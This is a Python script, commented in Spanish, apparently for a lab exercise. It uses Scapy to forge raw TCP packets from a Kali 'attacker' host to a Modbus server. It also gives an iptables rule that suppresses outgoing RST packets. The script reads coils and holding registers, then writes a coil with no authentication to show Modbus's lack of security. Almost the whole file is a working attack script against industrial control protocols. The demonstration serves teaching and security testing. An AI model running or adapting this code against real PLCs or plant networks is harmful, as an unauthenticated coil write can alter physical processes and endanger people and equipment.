#!/usr/bin/env python3
"""
Modbus TCP Client using Scapy - Para ejecutar en Kali (192.168.1.64)

Cliente Modbus que usa Scapy para forjar paquetes y comunicarse
con el servidor Modbus, demostrando la falta de seguridad del protocolo.

IMPORTANTE: Antes de ejecutar, deshabilitar RST automatico:
    sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.1.64 -j DROP

Uso:
    sudo python3 Modbus_client_scapy.py
"""

from scapy.all import *
import random
import sys

# ============================================
# CONFIGURACION - AJUSTAR SEGUN TU ENTORNO
# ============================================
SRC_IP = '192.168.1.64'      # IP de Kali (atacante)
DST_IP = '192.168.1.66'      # IP de Ubuntu (servidor Modbus)
DST_PORT = 502               # Puerto Modbus estandar

# Variables de sesion TCP
src_port = random.randint(1024, 65535)
seq_nr = random.randint(444, 8765432)
ack_nr = 0

# ============================================
# ESTRUCTURAS MODBUS (simplificadas)
# ============================================

def build_modbus_read_coils(trans_id, unit_id, start_addr, quantity):
    """Construye PDU para Read Coils (FC=01)"""
    mbap = struct.pack('>HHHB',
        trans_id,      # Transaction ID
        0,             # Protocol ID (siempre 0 para Modbus)
        6,             # Length (Unit ID + FC + Data)
        unit_id        # Unit ID
    )
    pdu = struct.pack('>BHH',
        0x01,          # Function Code: Read Coils
        start_addr,    # Starting Address
        quantity       # Quantity of Coils
    )
    return mbap + pdu

def build_modbus_read_holding_registers(trans_id, unit_id, start_addr, quantity):
    """Construye PDU para Read Holding Registers (FC=03)"""
    mbap = struct.pack('>HHHB',
        trans_id,      # Transaction ID
        0,             # Protocol ID
        6,             # Length
        unit_id        # Unit ID
    )
    pdu = struct.pack('>BHH',
        0x03,          # Function Code: Read Holding Registers
        start_addr,    # Starting Address
        quantity       # Quantity of Registers
    )
    return mbap + pdu

def build_modbus_write_single_coil(trans_id, unit_id, address, value):
    """Construye PDU para Write Single Coil (FC=05)"""
    mbap = struct.pack('>HHHB',
        trans_id,      # Transaction ID
        0,             # Protocol ID
        6,             # Length
        unit_id        # Unit ID
    )
    coil_value = 0xFF00 if value else 0x0000
    pdu = struct.pack('>BHH',
        0x05,          # Function Code: Write Single Coil
        address,       # Coil Address
        coil_value     # Value (0xFF00=ON, 0x0000=OFF)
    )
    return mbap + pdu

# ============================================
# FUNCIONES TCP
# ============================================

def tcp_handshake():
    """Establece conexion TCP con three-way handshake"""
    global seq_nr, ack_nr

    ip = IP(src=SRC_IP, dst=DST_IP)

    # Enviar SYN
    syn = TCP(sport=src_port, dport=DST_PORT, flags='S', seq=seq_nr)
    print(f"[*] Enviando SYN a {DST_IP}:{DST_PORT}...")

    syn_ack = sr1(ip/syn, timeout=5, verbose=0)

    if syn_ack is None:
        print("[-] ERROR: No se recibio SYN/ACK. Verifica que el servidor este corriendo.")
        sys.exit(1)

    if syn_ack[TCP].flags != 'SA':
        print(f"[-] ERROR: Se esperaba SYN/ACK, se recibio: {syn_ack[TCP].flags}")
        sys.exit(1)

    print("[+] Recibido SYN/ACK")

    # Enviar ACK
    ack_nr = syn_ack[TCP].seq + 1
    seq_nr = seq_nr + 1

    ack = TCP(sport=src_port, dport=DST_PORT, flags='A', seq=seq_nr, ack=ack_nr)
    send(ip/ack, verbose=0)
    print("[+] Conexion TCP establecida")

    return True

def send_modbus_request(modbus_data):
    """Envia solicitud Modbus y recibe respuesta"""
    global seq_nr, ack_nr

    ip = IP(src=SRC_IP, dst=DST_IP)
    tcp = TCP(sport=src_port, dport=DST_PORT, flags='PA', seq=seq_nr, ack=ack_nr)

    pkt = ip/tcp/Raw(load=modbus_data)

    # Enviar y esperar respuesta
    response = sr1(pkt, timeout=5, verbose=0)

    if response and Raw in response:
        # Actualizar numeros de secuencia
        seq_nr = seq_nr + len(modbus_data)
        ack_nr = response[TCP].seq + len(response[Raw].load)

        # Enviar ACK
        ack = TCP(sport=src_port, dport=DST_PORT, flags='A', seq=seq_nr, ack=ack_nr)
        send(ip/ack, verbose=0)

        return response[Raw].load

    return None

def close_connection():
    """Cierra la conexion TCP"""
    ip = IP(src=SRC_IP, dst=DST_IP)
    rst = TCP(sport=src_port, dport=DST_PORT, flags='RA', seq=seq_nr, ack=ack_nr)
    send(ip/rst, verbose=0)
    print("[*] Conexion cerrada")

def parse_modbus_response(data):
    """Parsea respuesta Modbus basica"""
    if len(data) < 8:
        return None

    trans_id = struct.unpack('>H', data[0:2])[0]
    proto_id = struct.unpack('>H', data[2:4])[0]
    length = struct.unpack('>H', data[4:6])[0]
    unit_id = data[6]
    func_code = data[7]

    return {
        'trans_id': trans_id,
        'proto_id': proto_id,
        'length': length,
        'unit_id': unit_id,
        'func_code': func_code,
        'data': data[8:]
    }

# ============================================
# EJECUCION PRINCIPAL
# ============================================

def main():
    print("=" * 60)
    print("MODBUS TCP CLIENT - SCAPY")
    print("Demostracion de vulnerabilidades del protocolo Modbus")
    print("=" * 60)
    print(f"Origen:  {SRC_IP}")
    print(f"Destino: {DST_IP}:{DST_PORT}")
    print("=" * 60)

    # Establecer conexion TCP
    if not tcp_handshake():
        return

    print("\n" + "-" * 60)
    print("PRUEBA 1: Leer Coils (FC=01)")
    print("-" * 60)

    # Leer 5 coils comenzando en direccion 0
    modbus_req = build_modbus_read_coils(
        trans_id=1,
        unit_id=1,
        start_addr=0,
        quantity=5
    )

    response = send_modbus_request(modbus_req)
    if response:
        parsed = parse_modbus_response(response)
        print(f"[+] Respuesta recibida:")
        print(f"    Transaction ID: {parsed['trans_id']}")
        print(f"    Function Code:  {parsed['func_code']}")
        print(f"    Data (hex):     {parsed['data'].hex()}")

    print("\n" + "-" * 60)
    print("PRUEBA 2: Leer Holding Registers (FC=03)")
    print("-" * 60)

    # Leer 5 holding registers comenzando en direccion 0
    modbus_req = build_modbus_read_holding_registers(
        trans_id=2,
        unit_id=1,
        start_addr=0,
        quantity=5
    )

    response = send_modbus_request(modbus_req)
    if response:
        parsed = parse_modbus_response(response)
        print(f"[+] Respuesta recibida:")
        print(f"    Transaction ID: {parsed['trans_id']}")
        print(f"    Function Code:  {parsed['func_code']}")
        print(f"    Data (hex):     {parsed['data'].hex()}")

        # Parsear valores de registros (16-bit cada uno)
        if len(parsed['data']) > 1:
            byte_count = parsed['data'][0]
            registers = parsed['data'][1:]
            print(f"    Byte Count:     {byte_count}")
            print(f"    Registros:")
            for i in range(0, len(registers), 2):
                if i+1 < len(registers):
                    value = struct.unpack('>H', registers[i:i+2])[0]
                    print(f"      Register {i//2}: {value}")

    print("\n" + "-" * 60)
    print("PRUEBA 3: Escribir Single Coil (FC=05) - SIN AUTENTICACION")
    print("-" * 60)

    # Escribir coil en direccion 0 = ON
    modbus_req = build_modbus_write_single_coil(
        trans_id=3,
        unit_id=1,
        address=0,
        value=True  # ON
    )

    response = send_modbus_request(modbus_req)
    if response:
        parsed = parse_modbus_response(response)
        print(f"[+] Escritura exitosa (sin autenticacion requerida):")
        print(f"    Transaction ID: {parsed['trans_id']}")
        print(f"    Function Code:  {parsed['func_code']}")

    print("\n" + "=" * 60)

    # Cerrar conexion
    close_connection()

    print("\n[!] VULNERABILIDADES DEMOSTRADAS:")
    print("    - Sin encriptacion: datos en texto plano")
    print("    - Sin autenticacion: lectura/escritura sin credenciales")
    print("    - Sin autorizacion: cualquier cliente puede ejecutar comandos")
    print("=" * 60)

if __name__ == "__main__":
    main()
